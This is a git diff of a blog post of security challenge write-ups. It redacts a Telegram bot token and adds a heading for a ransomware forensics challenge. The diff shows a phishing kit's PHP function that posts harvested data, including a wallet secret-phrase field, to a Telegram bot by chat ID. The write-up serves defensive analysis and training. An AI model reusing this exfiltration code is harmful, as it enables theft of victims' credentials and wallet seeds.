@@ -4,7 +4,7 @@ draft: false
 date: 2026-10-30T03:16:38.930Z
 categories:
   - Writeup
-lastmod: 2026-11-10T13:31:03.833Z
+lastmod: 2026-11-10T16:06:15.107Z
 description: Nothing is that serious, so please choose peace.
 cover: https://i.pinimg.com/1200x/a3/8c/bd/a38cbd1d6d6a1c4519f204926e5eca9d.jpg
 tags:
@@ -463,7 +463,7 @@ sendTel($message);
 	
     function sendTel($message){
 		$id = "5442785564"; 
-        $token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10"; 
+        $token = "54574*****:*******************************vxm10"; 
 		$filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&text=".urlencode($message)."&parse_mode=html";
 		file_get_contents($filename);
         $_POST["import-account__secret-phrase"]. $text = $_POST['data']."\n";;
@@ -531,10 +531,10 @@ $filename = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$id."&
 **Q8. What is the token for accessing the channel?**
 
 ```php
-$token = "5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10";
+$token = "54574*****:*******************************vxm10";
 ```
 
-`Answer: 5457463144:AAG8t4k7e2ew3tTi0IBShcWbSia0Irvxm10`
+`Answer: 54574*****:*******************************vxm10`
 
 **Q9. What is the Chat ID for the phisher's channel?**
 
@@ -764,6 +764,10 @@ We are presented with a malware hash `12c1842c3ccafe7408c23ebf292ee3d9`, and we 
 **Q6. What is the MD5 hash of the second malicious file?**
 
 
+## 11. BlueSky Ransomware
+- **Date**: Nov 11, 2026
+- **Difficulty**: CyberDefenders - SOC Analyst Tier 2 - Level 4
+- **Category**: Network Forensics
 
 
 
